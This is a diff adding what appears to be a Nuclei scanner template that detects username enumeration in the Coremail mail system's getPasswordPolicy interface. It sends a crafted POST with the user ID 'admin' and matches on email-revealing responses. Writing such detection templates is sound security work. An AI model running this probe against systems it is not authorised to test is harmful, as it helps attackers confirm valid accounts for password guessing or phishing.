@@ -1,0 +1,35 @@
+id: coremail-username-enumeration
+
+info:
+  name: Coremail - Username Enumeration
+  author: qwtd
+  severity: medium
+  description: |
+    comremail changePassword interface is vulnerable to username enumeration
+  tags: Coremail-邮件系统
+
+http:
+  - raw:
+      - |
+        POST /coremail/s/json?func=user:getPasswordPolicy  HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/x-json
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7
+
+        {"uid":"admin"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "dnEmail"
+          - "code"
+          - "@"
+        condition: and
+
+      - type: status
+        status:
+          - 200
